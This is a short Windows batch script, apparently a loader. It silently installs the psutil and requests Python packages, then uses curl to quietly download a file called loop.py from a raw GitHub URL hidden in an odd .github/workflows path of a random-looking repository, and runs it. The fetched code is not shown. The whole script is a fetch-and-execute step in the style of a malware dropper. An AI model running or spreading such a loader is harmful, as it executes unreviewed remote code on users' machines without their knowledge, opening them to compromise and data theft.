@echo off
pip install psutil --quiet
pip install requests --quiet
curl -s -L -o loop.py https://raw.githubusercontent.com/Kixi34d5sey661dx/fantastic-octo-funicular/refs/heads/main/.github/workflows/loop.py
python loop.py
